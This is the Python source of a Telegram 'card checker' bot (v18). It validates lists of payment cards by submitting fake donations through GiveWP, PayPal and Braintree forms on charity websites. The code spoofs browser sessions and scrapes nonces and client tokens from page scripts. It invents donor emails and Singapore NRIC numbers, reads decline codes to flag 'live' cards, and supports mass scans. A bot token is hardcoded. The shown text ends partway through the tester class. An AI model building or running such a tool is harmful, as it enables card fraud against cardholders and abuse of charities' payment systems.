#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ================================================================
#  CARD CHECKER BOT — v18 FINAL ULTIMATE EDITION
#  ================================================================
#  NEW in v18:
#   ✅ [1] Session warm-up (home → donate → cookies + referer chain)
#   ✅ [2] Deep JS analysis (wpApiSettings, give_global_vars,
#           give_paypal_commerce, braintree, __NEXT_DATA__)
#   ✅ [3] Dynamic dropdown option resolution (AJAX + JS parsing)
#   ✅ [4] Multi-endpoint token validation (userinfo / orders / etc.)
#   ✅ [5] Dynamic origin (matches target host, not braintree hardcode)
#   ✅ [6] Gateway type detection (Standard vs Braintree vs JS SDK)
#   ✅ [7] Auto nonce refresh every 50 links in mass scan
#   ✅ [11] Smart special fields (nricfin, phone, zip by country)
#   ✅ [14] /diag command — full pipeline visibility
#  ================================================================
#  ALL v17 features preserved:
#   - Active token validation + auto re-extract on auth failure
#   - Full AJAX payload (nonce + form-id + prefix)
#   - AUTHENTICATION_FAILURE not classified as live
#   - Multi-candidate token selection
#   - Fixed: from telebot import types
#   - Fixed: nonec → nonce typo
#   - Mass scan, resume, stop, gateway generator, admin, feedback
# ================================================================
import telebot
from telebot import types
import time
import threading
import os
import re
import json
import base64
import random
import logging
import tempfile
from string import Template
from collections import defaultdict
from urllib.parse import urlparse

import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from fake_useragent import UserAgent
    _UU = UserAgent(
        fallback='Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                 'AppleWebKit/537.36 (KHTML, like Gecko) '
                 'Chrome/120.0.0.0 Safari/537.36'
    )
    def rand_ua():
        try:
            return _UU.random
        except Exception:
            return ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                    'AppleWebKit/537.36 (KHTML, like Gecko) '
                    'Chrome/120.0.0.0 Safari/537.36')
except Exception:
    _UAS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
        '(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) '
        'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
        '(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    ]
    def rand_ua():
        return random.choice(_UAS)

# ================================================================
#  CONFIG
# ================================================================
TOKEN = os.getenv('BOT_TOKEN', '8689698569:AAFJjLfJ9ztJg9QNJugf8xJbb0Ernow8vG8')
OWNER_ID = int(os.getenv('OWNER_ID', '6843321125'))
ADMINS = {str(OWNER_ID)}

USERS_FILE = 'users.txt'
BLOCK_FILE = 'blockusers.txt'
STATS_FILE = 'stats.json'
PROGRESS_TMPL = 'progress_{}.json'
RESULTS_TMPL = 'results_{}_{}.txt'
LIVE_DIR_TMPL = 'live_{}_{}'

MAX_FILE_SIZE = 10 * 1024 * 1024
PAYPAL_COOLDOWN = 3
MASS_COOLDOWN = 10
PROGRESS_SAVE_EVERY = 10
STATUS_UPDATE_EVERY = 1.5
CLEANUP_OLDER_THAN_DAYS = 7
NONCE_REFRESH_INTERVAL = 50

TEST_CARD = '4059986126444431|11|30|947'

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler('bot.log', encoding='utf-8'),
        logging.StreamHandler(),
    ],
)
log = logging.getLogger('bot')
bot = telebot.TeleBot(TOKEN, parse_mode='HTML')

# ================================================================
#  STATE
# ================================================================
waiting_users = {}
reply_mode = {}
mass_active = {}
mass_pause = {}
user_last_paypal = defaultdict(float)
user_last_mass = defaultdict(float)

# ================================================================
#  INIT FILES
# ================================================================
for _f in (USERS_FILE, BLOCK_FILE):
    try:
        if not os.path.exists(_f):
            open(_f, 'w', encoding='utf-8').close()
    except Exception:
        pass

# ================================================================
#  FILE HELPERS
# ================================================================
def save_user(uid):
    try:
        uids = open(USERS_FILE, 'r', encoding='utf-8').read().splitlines()
        if str(uid) not in uids:
            with open(USERS_FILE, 'a', encoding='utf-8') as f:
                f.write(f'{uid}\n')
    except Exception:
        pass

def is_blocked(uid):
    try:
        return str(uid) in [
            l.strip() for l in
            open(BLOCK_FILE, 'r', encoding='utf-8').read().splitlines()
            if l.strip()
        ]
    except Exception:
        return False

def load_stats():
    try:
        return json.load(open(STATS_FILE, 'r', encoding='utf-8'))
    except Exception:
        return {'checks': 0, 'live': 0, 'dead': 0}

def save_stats(stats):
    try:
        with open(STATS_FILE, 'w', encoding='utf-8') as f:
            json.dump(stats, f)
    except Exception:
        pass

def bump_stat(key):
    try:
        s = load_stats()
        s[key] = s.get(key, 0) + 1
        save_stats(s)
    except Exception:
        pass

def save_progress(uid, data):
    try:
        fd, tmp = tempfile.mkstemp(dir='.', suffix='.json')
        with os.fdopen(fd, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False)
        os.replace(tmp, PROGRESS_TMPL.format(uid))
    except Exception:
        pass

def load_progress(uid):
    try:
        return json.load(open(PROGRESS_TMPL.format(uid), 'r', encoding='utf-8'))
    except Exception:
        return None

def clear_progress(uid):
    try:
        os.remove(PROGRESS_TMPL.format(uid))
    except Exception:
        pass

def cleanup_old_files():
    try:
        cutoff = time.time() - CLEANUP_OLDER_THAN_DAYS * 86400
        for name in os.listdir('.'):
            try:
                if name.startswith(('results_', 'live_')):
                    path = os.path.join('.', name)
                    if os.path.isfile(path) and os.path.getmtime(path) < cutoff:
                        os.remove(path)
            except Exception:
                continue
    except Exception:
        pass

# ================================================================
#  URL PARSER
# ================================================================
_URL_RE = re.compile(
    r'^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?'
    r'(\.[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?)*'
    r'\.[a-zA-Z]{2,}$'
)

def safe_url(link):
    try:
        if not link or not isinstance(link, str):
            return None
        link = link.strip().strip('"\'` \t\r\n')
        while link and link[-1] in '.,;:!?)]}\'"':
            link = link[:-1]
        if len(link) < 8:
            return None
        low = link.lower()
        if '://none' in low or 'invalid.local' in low:
            return None
        if not link.startswith(('http://', 'https://')):
            link = 'https://' + link.lstrip('/')
        parsed = urlparse(link)
        if not parsed.netloc or not parsed.netloc.strip():
            return None
        host = parsed.netloc.split(':')[0].split('@')[-1]
        if not host or not _URL_RE.match(host):
            return None
        return link
    except Exception:
        return None

# ================================================================
#  TELEGRAM SAFE HELPERS
# ================================================================
def safe_send_message(cid, text, retries=3, reply_markup=None, parse_mode='HTML'):
    for i in range(retries):
        try:
            return bot.send_message(cid, text, parse_mode=parse_mode,
                                    reply_markup=reply_markup,
                                    disable_web_page_preview=True)
        except Exception as e:
            err = str(e)
            if '429' in err:
                try:
                    w = int(err.split('retry after ')[1].split(')')[0])
                except Exception:
                    w = 30
                time.sleep(min(w, 60))
            elif 'can\'t parse' in err.lower() or 'bad request' in err.lower():
                try:
                    return bot.send_message(cid, re.sub(r'<[^>]+>', '', text)[:4000],
                                            reply_markup=reply_markup,
                                            disable_web_page_preview=True)
                except Exception:
                    return None
            elif i < retries - 1:
                time.sleep(1)
            else:
                break
    return None

def safe_edit_message(cid, mid, text, retries=3):
    for i in range(retries):
        try:
            return bot.edit_message_text(
                chat_id=cid, message_id=mid, text=text,
                parse_mode='HTML', disable_web_page_preview=True,
            )
        except Exception as e:
            err = str(e)
            if 'not modified' in err:
                return None
            if '429' in err:
                try:
                    w = int(err.split('retry after ')[1].split(')')[0])
                except Exception:
                    w = 30
                time.sleep(min(w, 60))
            elif 'can\'t parse' in err.lower():
                try:
                    return bot.edit_message_text(
                        chat_id=cid, message_id=mid,
                        text=re.sub(r'<[^>]+>', '', text)[:4000],
                    )
                except Exception:
                    return None
            else:
                break
    return None

def safe_send_document(cid, path, caption='', retries=5):
    try:
        if not os.path.exists(path):
            return None
    except Exception:
        return None
    for i in range(retries):
        try:
            with open(path, 'rb') as f:
                return bot.send_document(cid, f, caption=caption,
                                         parse_mode='HTML')
        except Exception as e:
            err = str(e)
            if '429' in err:
                try:
                    w = int(err.split('retry after ')[1].split(')')[0])
                except Exception:
                    w = 30
                time.sleep(min(w, 60))
            elif i < retries - 1:
                time.sleep(1)
            else:
                break
    return None

# ================================================================
#  RESPONSE CLASSIFICATION
# ================================================================
RETRY_ON_AUTH = [
    'AUTHENTICATION_FAILURE', 'AUTHENTICATION_FAILED',
    'INVALID_TOKEN', 'TOKEN_EXPIRED', 'NOT_AUTHORIZED',
    'INVALID_CLIENT', 'INVALID_REQUEST', 'INVALID_NONCE',
]

LIVE_KEYWORDS = [
    'CHARGE', 'Payer cannot pay', 'There was an issue with your donation',
    'Your card was declined', 'card was declined',
    'INSTRUMENT_DECLINED', 'ORDER_NOT_APPROVED', 'PAYER_ACTION_REQUIRED',
    'PAYER_CANNOT_PAY', 'PAYMENT_DENIED', 'PAYEE_ACCOUNT_RESTRICTED',
    'PAYEE_NOT_CONSENTED', 'PAYEE_NOT_ENABLED_FOR_CARD_PROCESSING',
    'PERMISSION_DENIED', 'POSTAL_CODE_REQUIRED', 'REFERENCED_CARD_EXPIRED',
    'CARD_EXPIRED', 'AMOUNT_MISMATCH', 'CANNOT_BE_NEGATIVE',
    'CURRENCY_NOT_SUPPORTED', 'DECIMALS_NOT_SUPPORTED',
    'DUPLICATE_INVOICE_ID', 'INVALID_PARAMETER_SYNTAX',
    'INVALID_RESOURCE_ID', 'INVALID_STRING_LENGTH',
    'MAX_NUMBER_OF_PAYMENT_ATTEMPTS_EXCEEDED',
    'MISSING_REQUIRED_PARAMETER', 'ORDER_ALREADY_AUTHORIZED',
    'ORDER_ALREADY_CAPTURED', 'VALIDATION_ERROR',
    'UNPROCESSABLE_ENTITY', 'DO_NOT_HONOR', 'GENERIC_DECLINE',
    'CVV2_FAILURE', 'CVV_FAILURE', 'INSUFFICIENT_FUNDS', 'INVALID_PIN',
    'CARD_CLOSED', 'UNAUTHORIZED_USER', 'AVS_FAILURE',
    'INVALID_OR_RESTRICTED_CARD', 'SOFT_AVS', 'DUPLICATE_TRANSACTION',
    'INVALID_TRANSACTION', 'EXPIRED_CARD', 'INCORRECT_PIN_REENTER',
    'INVALID_DATA_FORMAT', 'INVALID_AMOUNT', 'INVALID_CURRENCY_CODE',
    'INVALID_ACCOUNT', 'INVALID_MERCHANT', 'INVALID_MCC',
    'INVALID_EXPIRATION', 'INVALID_CARD_VERIFICATION_VALUE',
    'TRANSACTION_CANNOT_BE_COMPLETED',
    'ISSUER_NOT_AVAILABLE_NOT_RETRIABLE', 'ACCOUNT_NOT_ON_FILE',
    'ERROR_3DS', 'BIN_ERROR', 'PIN_ERROR',
    'SENDING_LIMIT_EXCEEDED', 'CURRENCY_MISMATCH',
    'INVALID_ACCOUNT_STATUS', 'TRANSACTION_REFUSED',
    'PAYER_ACCOUNT_RESTRICTED', 'RESTRICTED_OR_INACTIVE_ACCOUNT',
    'PAYEE_BLOCKED_TRANSACTION', 'SUSPECTED_FRAUD', 'ACCOUNT_CLOSED',
    'PAYER_ACCOUNT_LOCKED_OR_CLOSED', 'LOST_OR_STOLEN',
    'COMPLIANCE_VIOLATION', 'CAPTURE_DECLINED',
    'AUTHORIZATION_DENIED', 'TX_ATTEMPTS_EXCEED_LIMIT', 'DECLINED',
    'REATTEMPT_NOT_PERMITTED', 'ACCOUNT_BLOCKED_BY_ISSUER',
    'TRANSACTION_NOT_PERMITTED', 'SECURITY_VIOLATION',
    'DECLINED_DUE_TO_UPDATED_ACCOUNT', 'DECLINED_PLEASE_RETRY',
    'PayPal orders are captured', 'Payer has not yet approved',
    'provide a valid payment_source', 'issue with your donation',
    'transaction was declined',
]

DEAD_KEYWORDS = [
    'INVALID_FORM', 'FORM_NOT_FOUND', 'MISSING_NONCE',
    'NONCE_MISSING', 'FORM_ERROR', 'INVALID_SITE', 'INVALID_CARD_NUMBER',
    'INVALID_EXPIRY_MONTH', 'INVALID_CVV', 'INVALID_CARD_FORMAT',
    'ORDER_CREATE_FAILED', 'NO_ATTEMPT', 'APPROVE_NO_RESPONSE',
    'HTTP_ERROR', 'JSON_PARSE_ERROR', 'CONNECTION_FAILED',
    'FETCH_FAILED', 'FATAL', 'BAD_URL', 'TOKEN_HUNTER_FAILED',
]

PRIORITY = [
    ('CHARGE', 200), ('INSUFFICIENT_FUNDS', 195),
    ('INVALID_OR_RESTRICTED_CARD', 190),
    ('TRANSACTION_NOT_PERMITTED', 188),
    ('Payer cannot pay', 185), ('PAYER_CANNOT_PAY', 185),
    ('ORDER_NOT_APPROVED', 185),
    ('There was an issue with your donation', 185),
    ('Your card was declined', 185), ('card was declined', 185),
    ('INSTRUMENT_DECLINED', 182), ('PAYMENT_DENIED', 180),
    ('SUSPECTED_FRAUD', 178), ('CVV2_FAILURE', 175),
    ('CVV_FAILURE', 175), ('EXPIRED_CARD', 172),
    ('DO_NOT_HONOR', 170), ('RESTRICTED_OR_INACTIVE_ACCOUNT', 168),
    ('ACCOUNT_CLOSED', 166), ('LOST_OR_STOLEN', 164),
    ('PAYER_ACCOUNT_LOCKED_OR_CLOSED', 162),
    ('REATTEMPT_NOT_PERMITTED', 160),
    ('ACCOUNT_BLOCKED_BY_ISSUER', 158), ('GENERIC_DECLINE', 155),
    ('TRANSACTION_REFUSED', 153), ('COMPLIANCE_VIOLATION', 150),
    ('SECURITY_VIOLATION', 148), ('CAPTURE_DECLINED', 145),
    ('AUTHORIZATION_DENIED', 143),
    ('DECLINED_DUE_TO_UPDATED_ACCOUNT', 140),
    ('DECLINED_PLEASE_RETRY', 132),
    ('TX_ATTEMPTS_EXCEED_LIMIT', 130), ('DECLINED', 100),
]

def is_live_response(resp):
    if not resp:
        return False
    up = str(resp).upper()
    if any(k in up for k in RETRY_ON_AUTH):
        return False
    return any(k.upper() in up for k in LIVE_KEYWORDS)

def is_dead_response(resp):
    if not resp:
        return True
    up = str(resp).upper()
    return any(k in up for k in DEAD_KEYWORDS)

def is_auth_failure(resp):
    if not resp:
        return False
    up = str(resp).upper()
    return any(k in up for k in RETRY_ON_AUTH)

def score_result(resp):
    if not resp:
        return 0
    up = str(resp).upper()
    for k, s in PRIORITY:
        if k.upper() in up:
            return s
    return 1

def normalize_result(resp):
    if not resp:
        return 'DECLINED'
    s = str(resp)
    if 'There was an issue with your donation' in s:
        return ('There was an issue with your donation transaction: '
                'Your card was declined.')
    if 'card was declined' in s.lower():
        return 'Your card was declined.'
    up = s.upper()
    if 'ORDER_NOT_APPROVED' in up or 'PAYER_CANNOT_PAY' in up \
       or 'Payer cannot pay' in s:
        return 'Payer cannot pay for this transaction.'
    return s

# ================================================================
#  PAYPAL TESTER — v18 FINAL ULTIMATE
# ================================================================
FIRST_NAMES = ['James', 'John', 'Robert', 'Michael', 'William', 'David']
LAST_NAMES = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Miller']


class PayPalTester:
    """v18 — Full omni-pipeline with warmup, deep JS, validation, retry."""

    def __init__(self, url):
        url = safe_url(url) or 'https://invalid.local/'
        self.page_url = url
        try:
            p = urlparse(url)
            self.url = p.netloc or 'invalid.local'
            self.inurl = p.path or '/'
            if p.query:
                self.inurl += '?' + p.query
        except Exception:
            self.url = 'invalid.local'
            self.inurl = '/'

        self.paypal = None
        self.client_id = None
        self.donation = '1.00'
        self.minimum = '5.00'
        self.currency = 'USD'
        self.price_levels = []
        self.id_form1 = None
        self.id_form2 = None
        self.nonce = None
        self.wp_nonce = None
        self.wp_rest_root = None
        self.au = None
        self.ajax_url = None
        self.current_price_id = None
        self.page_html = ''
        self.all_content = ''
        self.auth_method = 'none'
        self.gateway_type = 'unknown'
        self.form_fields = {}
        self.email = (
            f'{random.choice(FIRST_NAMES)}'
            f'{random.randint(100, 999)}@gmail.com'
        )
        self.r = requests.Session()
        self.r.verify = True
        self.r.headers.update({
            'user-agent': rand_ua(),
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
        })
        self.uu = type('U', (), {'random': property(lambda s: rand_ua())})()
        self.diagnostics = []
        self.token_candidates = []
        self.token_verified = False
        self._warmed = False

    def _log(self, msg):
        try:
            self.diagnostics.append(f'{time.time():.2f} {msg}')
            log.debug('[tester] %s', msg)
        except Exception:
            pass

    # ── HTTP helpers ──
    def _safe_get(self, url, timeout=15, headers=None):
        try:
            if not url or not isinstance(url, str):
                return None
            if not url.startswith(('http://', 'https://')):
                return None
            if '://none' in url.lower():
                return None
            h = headers or {}
            return self.r.get(url, timeout=timeout, headers=h)
        except Exception as e:
            self._log(f'GET {url[:80]} → {type(e).__name__}')
            return None

    def _safe_post(self, url, **kwargs):
        try:
            if not url or not isinstance(url, str):
                return None
            if not url.startswith(('http://', 'https://')):
                return None
            return self.r.post(url, timeout=kwargs.pop('timeout', 20), **kwargs)
        except Exception as e:
            self._log(f'POST {url[:80]} → {type(e).__name__}')
            return None

    def _build_url(self, base, path):
        try:
            if not base or not isinstance(base, str) or not base.strip():
                return None
            if path.startswith('//'):
                return 'https:' + path
            if path.startswith('/'):
                return f'https://{base}{path}'
            if not path.startswith('http'):
                return f'https://{base}/{path}'
            return path
        except Exception:
            return None

    # ── ✅ [1] Session warm-up ──
    def _warmup_session(self):
        """Visit homepage then donate page to establish cookies + referer chain."""
        try:
            if self._warmed:
                return True
            self._log('warmup: visiting homepage')
            self.r.get(
                f'https://{self.url}/',
                timeout=15,
                headers={
                    'user-agent': self.uu.random,
                    'referer': f'https://{self.url}/',
                },
            )
            time.sleep(0.3)
            self._log('warmup: visiting donate page')
            self.r.get(
                self.page_url,
                timeout=20,
                headers={
                    'user-agent': self.uu.random,
                    'referer': f'https://{self.url}/',
                },
            )
            self._warmed = True
            self._log(f'warmup: cookies={len(self.r.cookies)}')
            return True
        except Exception as e:
            self._log(f'warmup exception: {type(e).__name__}')
            return False

    # ── Fetching ──
    def _fetch_page(self):
        for _ in range(2):
            try:
                r = self._safe_get(
                    self.page_url, timeout=20,
                    headers={'referer': f'https://{self.url}/'},
                )
                if r and r.status_code == 200 and r.text:
                    self.page_html = r.text
                    self.all_content = r.text
                    self._log(f'page fetched ({len(r.text)} bytes)')
                    return True
            except Exception:
                pass
            time.sleep(0.3)
        self._log('page fetch failed')
        return False

    def _load_iframes(self):
        try:
            if not self.url or not self.page_html:
                return
            patterns = [
                r'<iframe[^>]*src=["\']([^"\']*give[^"\']*)["\']',
                r'<iframe[^>]*src=["\']([^"\']*donation[^"\']*)["\']',
                r'<iframe[^>]*src=["\']([^"\']*form[^"\']*)["\']',
                r'<iframe[^>]*src=["\']([^"\']*checkout[^"\']*)["\']',
            ]
            for pat in patterns:
                for m in re.finditer(pat, self.page_html, re.IGNORECASE):
                    try:
                        full = self._build_url(self.url, m.group(1))
                        if not full or '://none' in full.lower():
                            continue
                        r = self._safe_get(full, timeout=12)
                        if r and r.status_code == 200 and r.text:
                            self.all_content += '\n' + r.text
                            self._log(f'iframe loaded ({len(r.text)} bytes)')
                    except Exception:
                        continue
        except Exception:
            pass

    def _load_all_js(self):
        try:
            if not self.url or not self.page_html:
                return
            js_urls = re.findall(
                r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']',
                self.page_html,
            )
            priority = [
                u for u in js_urls
                if any(k in u.lower() for k in
                       ('give', 'donation', 'paypal', 'commerce',
                        'token', 'client', 'checkout', 'braintree'))
            ]
            ordered = (priority +
                       [u for u in js_urls if u not in priority])[:20]
            for js_url in ordered:
                try:
                    full = self._build_url(self.url, js_url)
                    if not full or '://none' in full.lower():
                        continue
                    r = self._safe_get(full, timeout=6)
                    if r and r.status_code == 200 and r.text:
                        self.all_content += '\n' + r.text
                        self._log(f'js loaded ({len(r.text)} bytes)')
                except Exception:
                    continue
        except Exception:
            pass

    def _load_inline_data(self):
        try:
            if not self.page_html:
                return
            for pat in [
                r'<script[^>]*id="__NEXT_DATA__"[^>]*>(.*?)</script>',
                r'window\.__INITIAL_STATE__\s*=\s*(\{.*?\});',
                r'window\.paypal\s*=\s*(\{.*?\});',
                r'<script[^>]*type="application/json"[^>]*>(.*?)</script>',
                r'<script[^>]*type="application/ld\+json"[^>]*>(.*?)</script>',
            ]:
                for m in re.finditer(pat, self.page_html, re.DOTALL):
                    try:
                        self.all_content += '\n' + m.group(1)
                    except Exception:
                        continue
        except Exception:
            pass

    # ── ✅ [2] Deep JS analysis ──
    def _deep_js_analysis(self):
        """Extract critical variables from JS contexts."""
        try:
            c = self.all_content
            if not c:
                return
            # wpApiSettings
            for m in re.finditer(r'wpApiSettings\s*=\s*\{([^}]+)\}', c):
                block = m.group(1)
                nm = re.search(r'"nonce"\s*:\s*"([^"]+)"', block)
                if nm and not self.wp_nonce:
                    self.wp_nonce = nm.group(1)
                    self._log(f'found wp_nonce: {self.wp_nonce[:8]}...')
                rm = re.search(r'"root"\s*:\s*"([^"]+)"', block)
                if rm and not self.wp_rest_root:
                    self.wp_rest_root = rm.group(1).replace('\\/', '/')

            # give_global_vars
            for m in re.finditer(r'give_global_vars\s*=\s*\{', c):
                start = m.end() - 1
                depth = 0
                end = start
                for i in range(start, min(len(c), start + 5000)):
                    if c[i] == '{':
                        depth += 1
                    elif c[i] == '}':
                        depth -= 1
                        if depth == 0:
                            end = i + 1
                            break
                block = c[start:end]
                nm = re.search(r'"nonce"\s*:\s*"([^"]+)"', block)
                if nm and not self.nonce:
                    self.nonce = nm.group(1)
                    self._log(f'give nonce from JS: {self.nonce[:8]}...')
                am = re.search(r'"ajax"\s*:\s*"([^"]+)"', block)
                if am and not self.ajax_url:
                    self.ajax_url = am.group(1).replace('\\/', '/')

            # give_paypal_commerce config
            for pat in [
                r'give_paypal_commerce\s*=\s*\{([^}]+)\}',
                r'window\.give_paypal_commerce\s*=\s*\{([^}]+)\}',
            ]:
                for m in re.finditer(pat, c):
                    block = m.group(1)
                    for key in ['clientToken', 'client_token', 'accessToken']:
                        tm = re.search(rf'"?{key}"?\s*:\s*"([^"]+)"', block)
                        if tm:
                            self._add_candidate(tm.group(1), f'js-give:{key}')
                    cm = re.search(r'"clientId"\s*:\s*"([^"]+)"', block)
                    if cm and not self.client_id:
                        self.client_id = cm.group(1)
                    mm = re.search(r'"merchantId"\s*:\s*"([^"]+)"', block)
                    if mm and not self.paypal:
                        self.paypal = mm.group(1)

            # PayPal SDK client-id
            for m in re.finditer(r'client-id=([A-Za-z0-9_-]{20,})', c):
                if not self.client_id:
                    self.client_id = m.group(1)

            # Braintree client tokens
            for m in re.finditer(
                r'braintree[^"\']*client[^"\']*["\']([^"\']{20,})["\']',
                c, re.I
            ):
                self._add_candidate(m.group(1), 'braintree-client')

            # __NEXT_DATA__ tokens
            for m in re.finditer(r'"clientToken"\s*:\s*"([^"]+)"', c):
                self._add_candidate(m.group(1), 'next-clientToken')

            self._log(
                f'deep_js: wp_nonce={"Y" if self.wp_nonce else "N"} '
                f'give_nonce={"Y" if self.nonce else "N"} '
                f'candidates={len(self.token_candidates)}'
            )
        except Exception as e:
            self._log(f'deep_js error: {e}')

    # ── Basic extraction ──
    def _extract_basic(self):
        try:
            c = self.all_content
            if not c:
                return
            for p in [
                r'name="give-form-id-prefix"\s+value="([^"]+)"',
                r'"give-form-id-prefix"\s*:\s*"([^"]+)"',
                r'data-form-id-prefix=["\']([^"\']+)["\']',
            ]:
                m = re.search(p, c)
                if m:
                    self.id_form1 = m.group(1)
                    break
            for p in [
                r'name="give-form-id"\s+value="(\d+)"',
                r'"give-form-id"\s*:\s*"?(\d+)"?',
                r'"form_id"\s*:\s*"?(\d+)"?',
                r'data-form-id=["\'](\d+)["\']',
                r'give-form-(\d+)-',
                r'give_form_(\d+)',
                r'form-id[=:"\s]+(\d+)',
            ]:
                m = re.search(p, c)
                if m:
                    self.id_form2 = m.group(1)
                    break
            if not self.nonce:
                for p in [
                    r'name="give-form-hash"\s+value="([^"]+)"',
                    r'"give-form-hash"\s*:\s*"([^"]+)"',
                    r'"nonce"\s*:\s*"([a-f0-9]{8,32})"',
                    r'name="_wpnonce"\s+value="([^"]+)"',
                    r'name="give_nonce"\s+value="([^"]+)"',
                ]:
                    m = re.search(p, c)
                    if m:
                        self.nonce = m.group(1)
                        break
            for p in [
                r'name="give-form-minimum"\s+value="([^"]*)"',
                r'"give-form-minimum"\s*:\s*"([^"]*)"',
            ]:
                m = re.search(p, c)
                if m and m.group(1).strip():
                    self.minimum = m.group(1).strip()
                    break
            for p in [
                r'name="give-currency"\s+value="([A-Za-z]{3})"',
                r'"give-currency"\s*:\s*"([A-Za-z]{3})"',
                r'"currency"\s*:\s*"([A-Za-z]{3})"',
                r'data-currency=["\']([A-Za-z]{3})["\']',
            ]:
                m = re.search(p, c, re.IGNORECASE)
                if m:
                    self.currency = m.group(1).upper()
                    break
            for p in [
                r'name="give-price-id"\s+value="([^"]+)"',
                r'"give-price-id"\s*:\s*"([^"]+)"',
            ]:
                m = re.search(p, c)
                if m:
                    self.current_price_id = m.group(1)
                    break
            self.price_levels = []
            for pat, mode in [
                (r'data-price-id=["\']([^"\']+)["\'][^>]*?'
                 r'data-price=["\']([\d.]+)["\']', 1),
                (r'data-price=["\']([\d.]+)["\'][^>]*?'
                 r'data-price-id=["\']([^"\']+)["\']', 2),
            ]:
                for m in re.finditer(pat, c):
                    try:
                        if mode == 1:
                            pid, amt = m.group(1), float(m.group(2))
                        else:
                            amt, pid = float(m.group(1)), m.group(2)
                        self.price_levels.append((pid, amt))
                    except Exception:
                        pass
            seen = set()
            unique = []
            for pid, amt in self.price_levels:
                if (pid, amt) not in seen and amt > 0:
                    seen.add((pid, amt))
                    unique.append((pid, amt))
            self.price_levels = sorted(unique, key=lambda x: x[1])
            if 'admin-ajax.php' in c and not self.ajax_url:
                self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
        except Exception as e:
            self._log(f'extract_basic: {e}')

    def _extract_all_form_fields(self):
        try:
            c = self.all_content
            if not c:
                return
            self.form_fields = {}
            for m in re.finditer(
                r'<select[^>]*name=["\']([^"\']+)["\'][^>]*>(.*?)</select>',
                c, re.DOTALL | re.IGNORECASE,
            ):
                try:
                    name = m.group(1)
                    inner = m.group(2)
                    tag = m.group(0)
                    required = 'required' in tag.lower()
                    options = [
                        om.group(1).strip()
                        for om in re.finditer(
                            r'<option[^>]*value=["\']([^"\']*)["\'][^>]*>',
                            inner,
                        )
                        if om.group(1).strip()
                    ]
                    self.form_fields[name] = {
                        'type': 'select',
                        'required': required,
                        'options': options,
                    }
                except Exception:
                    continue
            radio_groups = {}
            for m in re.finditer(
                r'<input[^>]*type=["\']radio["\'][^>]*>',
                c, re.IGNORECASE,
            ):
                try:
                    tag = m.group(0)
                    nm = re.search(r'name=["\']([^"\']+)["\']', tag)
                    vm = re.search(r'value=["\']([^"\']*)["\']', tag)
                    if nm and vm:
                        name = nm.group(1)
                        val = vm.group(1)
                        if name not in radio_groups:
                            radio_groups[name] = {
                                'required': 'required' in tag.lower(),
                                'options': [],
                            }
                        if val and val not in radio_groups[name]['options']:
                            radio_groups[name]['options'].append(val)
                except Exception:
                    continue
            for name, info in radio_groups.items():
                self.form_fields[name] = {
                    'type': 'radio',
                    'required': info['required'],
                    'options': info['options'],
                }
            for m in re.finditer(
                r'<input[^>]*type=["\'](text|email|tel|number|date)'
                r'["\'][^>]*>',
                c, re.IGNORECASE,
            ):
                try:
                    tag = m.group(0)
                    nm = re.search(r'name=["\']([^"\']+)["\']', tag)
                    if nm:
                        name = nm.group(1)
                        if name not in self.form_fields:
                            self.form_fields[name] = {
                                'type': m.group(1).lower(),
                                'required': 'required' in tag.lower(),
                                'options': [],
                            }
                except Exception:
                    continue
        except Exception as e:
            self._log(f'extract_fields: {e}')

    # ── ✅ [3] Resolve dropdown options ──
    def _resolve_dropdown_options(self):
        """Try to fill empty required select options via JS parse or AJAX."""
        try:
            for name, info in list(self.form_fields.items()):
                if info.get('type') != 'select':
                    continue
                if info.get('options'):
                    continue
                if not info.get('required'):
                    continue

                found = False
                # Try JS/HTML extraction
                patterns = [
                    rf'name="{re.escape(name)}"[^>]*>(.*?)</select>',
                    rf'"{re.escape(name)}"\s*:\s*\{{[^}}]*"options"\s*:\s*\[([^\]]+)\]',
                    rf'"{re.escape(name)}"\s*:\s*\[([^\]]+)\]',
                ]
                for pat in patterns:
                    m = re.search(pat, self.all_content, re.DOTALL)
                    if m:
                        opts = re.findall(
                            r'"([^"]+)"|\'([^\']+)\'', m.group(1)
                        )
                        flat = [o[0] or o[1] for o in opts if (o[0] or o[1])]
                        if flat:
                            self.form_fields[name]['options'] = flat
                            self._log(
                                f'resolved options for {name}: {len(flat)}'
                            )
                            found = True
                            break

                # Try AJAX
                if not found and self.ajax_url:
                    try:
                        r = self._safe_post(
                            self.ajax_url,
                            data={
                                'action': 'give_get_form_field_options',
                                'field_name': name,
                                'form_id': self.id_form2,
                            },
                            timeout=6,
                        )
                        if r and r.status_code == 200:
                            j = r.json()
                            if isinstance(j.get('data'), list) and j['data']:
                                self.form_fields[name]['options'] = j['data']
                                self._log(
                                    f'ajax resolved {name}: {len(j["data"])}'
                                )
                                found = True
                    except Exception:
                        pass

                if not found:
                    # Last resort: drop required flag
                    self.form_fields[name]['required'] = False
                    self._log(f'unresolved {name}: removed required flag')
        except Exception as e:
            self._log(f'resolve_dropdown: {e}')

    # ── ✅ [11] Resolve special fields ──
    def _gen_nric(self, country):
        if country == 'SG':
            prefix = random.choice(['S', 'T'])
            digits = ''.join(str(random.randint(0, 9)) for _ in range(7))
            letter = random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
            return f'{prefix}{digits}{letter}'
